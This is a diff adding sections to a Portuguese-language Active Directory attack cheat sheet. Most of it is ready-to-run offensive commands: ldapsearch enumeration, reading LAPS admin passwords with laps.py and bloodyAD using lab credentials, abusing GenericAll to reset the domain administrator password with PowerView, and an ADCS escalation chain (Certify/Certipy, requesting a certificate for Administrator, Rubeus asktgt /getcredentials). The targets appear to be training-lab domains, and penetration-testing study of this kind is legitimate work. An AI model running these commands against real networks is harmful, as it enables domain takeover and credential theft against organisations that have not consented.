@@ -753,3 +753,113 @@ Invoke-Bloodhound -CollectionMethod All -Domain domain.local -ZipFileName loot.z
 # Queries customizadas
 
 https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/
+
+# LDAP ataque
+
+ldapsearch -x -s base namingcontexts -H ldap://<SERVER-IP>
+
+ldapsearch -x -b "DC=DOMAIN,DC=COM" -H ldap://<SERVER-IP>
+
+ldapsearch -x -b "DC=DOMAIN,DC=COM" -H ldap://<SERVER-IP> '(objectClass=Person)' > users.txt
+
+# Importante olhar por descrições no LDAP:
+
+ldapsearch -x -b "DC=DOMAIN,DC=COM" -H ldap://<SERVER-IP> | grep description
+
+ldapsearch -x -b "DC=DOMAIN,DC=COM" -H ldap://<SERVER-IP> -D "cn=admin,dc=DOMAIN,dc=COM" -W
+
+**LDAP Read LAPS Password**
+
+python3 laps.py -u fmcsorley -d hutch.offsec -p CrabSharkJellyfish192 -l 192.168.51.122
+
+python3 bloodyAD.py -u fmcsorley -d hutch.offsec -p CrabSharkJellyfish192 --host 192.168.51.122 getObjectAttributes LAPS_PC$ ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
+
+**Explorando Domain Trust**
+
+# Esse modulo é default do Windows
+
+Add-WindowsCapability -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0 -Online
+
+Get-Module -Name ActiveDirectory -ListAvailable
+
+Import-Module activedirectory
+
+Get-ADTrust -Filter *
+
+# Checando o relacionamento de confiança
+
+Get-DomainTrust
+
+# Mapeando o domain trust
+
+Get-DomainTrustMapping
+
+# Checando usuários no child domain
+
+Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName
+
+# Abusando GenericAll
+
+$SecPassword = ConvertTo-SecureString 'password123' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN.COM\USERNAME', $SecPassword)
+$admPassword = ConvertTo-SecureString 'pasword@123' -AsPlainText -Force
+Set-DomainUserPassword -Identity administrator -AccountPassword $admPassword -Credential $Cred -Verbose
+
+# Ou podemos executar o Powershell como o usuário executar somente a linha abaixo
+
+$admPassword = ConvertTo-SecureString 'password@123' -AsPlainText -Force
+Set-DomainUserPassword -Identity administrator -AccountPassword $admPassword -Credential $Cred -Verbose
+
+# Enumerando ADCS
+
+crackmapexec ldap DOMAIN.COM -d 'DOMAIN.COM' -u 'USERNAME' -p 'PASSWORD' -M adcs
+
+# Atacando ADCS
+
+https://hyperbeast.es/escape-htb/
+https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates
+https://github.com/GhostPack/Certify
+
+
+# Enumerate trusted root CA certificates, certificates defined by the NTAuthCertificates object, and various information about Enterprise CAs
+
+Certify.exe cas
+
+# Enumerate certificate templates
+
+Certify.exe find
+
+#Enumerate vulenrable certificate templater
+
+Certify.exe find /vulnerable 
+
+# https://github.com/ly4k/Certipy
+
+certipy find -u john@corp.local -p Passw0rd -dc-ip <DC-IP>
+ 
+#Search vulnerable templates
+certipy find -vulnerable [-hide-admins] -u john@corp.local -p Passw0rd -dc-ip <DC-IP>
+
+# Enumerate Enterprise CAs
+
+certutil.exe -TCAInfo
+
+# Enumerate certificate templates
+
+certutil -v -dstemplate 
+
+.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator
+
+openssl pkcs12 -in cert.pem -inkey private.key -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+
+.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials
+
+# PowerView - Group Generic All
+
+Add-DomainObjectAcl -TargetIdentity "<IDENTITY>" -Rights All -PrincipalIdentity <SPN-ACC>
+Add-DomainGroupMember -Identity '<IDENTITY>' -Members '<SPN-ACC>'
+
+# Attcacking Domain trust and Forest
+
+https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-trust-accountusd-accessing-resources-on-a-trusted-domain-from-a-trusting-domain
+
